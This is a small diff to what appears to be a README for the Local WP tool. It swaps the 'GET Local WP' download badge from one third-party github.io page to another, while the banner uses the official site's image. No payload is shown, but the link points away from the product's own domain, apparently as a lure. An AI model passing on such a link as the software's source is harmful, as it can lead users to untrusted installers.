@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://localwp.com/wp-content/themes/flywheel-local-theme/images/meta_share_image.png)
 
-[![GET Local WP](https://img.shields.io/badge/GET%20%E2%80%94%20Local%20WP-0078D6?style=for-the-badge&logoColor=white)](https://edgarcostartqd.github.io/.github/local-wp)
+[![GET Local WP](https://img.shields.io/badge/GET%20%E2%80%94%20Local%20WP-0078D6?style=for-the-badge&logoColor=white)](https://local-wp-kit.github.io/.github/)
 
 ---
 
